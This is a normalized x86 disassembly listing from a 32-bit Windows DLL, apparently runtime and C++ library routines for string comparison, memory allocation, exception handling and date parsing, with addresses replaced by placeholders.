call sub_1005aab0
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1005dcbd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
mov edx ecx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x2
movzx edx [ edi ]
add eax 0x2
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
add ecx 0x2
cmp [ eax + ecx ] bx
jne r-xdata
sub_1005dd20
push ebp
mov ebp esp
push 0xffffffff
push sub_10081c00
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_10010ea0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10036380
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_10039b60
test eax eax
jne r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_100466d0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_10036380
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_10039b60
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_10044320
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_10036380
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x2 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_10039b60
test eax eax
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
lea esi [ ebp - 0x48 ]
mov edx ebx
call sub_1005f620
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10036380
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
lea eax [ edi + 0x3 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x48 ]
push eax
call sub_1006591f
add esp 0x4
sub_1005dec3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_10034317
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_10034317
pop ecx
pop ecx
mov ecx esi
sub ecx eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test ecx ecx
setns al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
sub_1005df26
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002ada5
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_100027ad
pop ecx
mov esi eax
call sub_1004fd6f
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1005df49
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x20
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10005213
jmp r-xdata
sub_1005dfd0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_1005deb0
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ esp + 0x10 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_100796a0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_1005e0ad
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100161cd
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1005e170
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1005e1c0
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_1005e20f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019f17
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1005e23c
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001c61b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1005e2d9
push 0x10
push r--data
call sub_10079bf0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1005e39b
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_10039c8c
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_10079c35
retn
call sub_100680f5
call sub_100680f5
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_1007c180
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1005e3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov ecx eax
call sub_1005d450
jmp r-xdata
push 0x20
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
pop esi
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_1005e475
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1005c3b0
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_1005e4dd
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004b8e6
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1005e57a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1005e5b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008248b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp edx 0x5
ja r-xdata
or eax 0xffffffff
jmp [ edx * 4 + jump_table_1005e6bc ]
mov ecx [ ecx + 0x4 ]
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push 0xffffffff
push ecx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
lea edx [ ebp - 0x218 ]
push 0x5c
push edx
call sub_10030ad6
add esp 0x8
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ecx + 0x24 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
xor ecx ecx
lea edx [ ebp - 0x218 ]
lea edi [ ebp - 0x248 ]
lea esi [ ebp - 0x23c ]
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] ecx
call sub_10002dc0
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
add edi 0x1c
mov ecx esi
call sub_100173a0
call sub_1005e450
push 0x104
add eax 0x2
push eax
lea eax [ ebp - 0x218 ]
push 0x104
push eax
call sub_100402aa
add esp 0x10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1005e6d4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov ebx ecx
mov eax [ ebx ]
push edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10066573
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10066573
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1005c3b0
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1005c3b0
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10066573
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10066573
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1005c3b0
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1005c3b0
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1005c3b0
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1005c3b0
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
sub_1005eb00
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x18
push esi
mov esi [ ecx + 0x3a0 ]
mov ecx [ ecx + 0x3a4 ]
xor eax eax
push edi
cmp esi ecx
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ esi ]
cmp edx [ edi ]
je r-xdata
mov eax edi
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
test [ eax + edx + 0x3c ] 0x6
jne r-xdata
add esi 0x4
cmp esi ecx
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x18 ]
push edx
call eax
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
sub eax edi
mov [ esp + 0x14 ] ecx
add eax ecx
mov eax [ eax + esi + 0x68 ]
mov edx [ eax ]
mov edx [ edx + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov ecx eax
call edx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
sub eax edi
add eax ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push 0x0
lea edi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
push edx
push eax
add ecx 0x30
push ecx
call sub_10044b90
mov esi [ esi ]
mov edx [ esi + 0x30 ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0x3c ] 0x6
jne r-xdata
sub_1005ebf2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004d322
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1005ec40
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10032fdb
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1005ec92
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
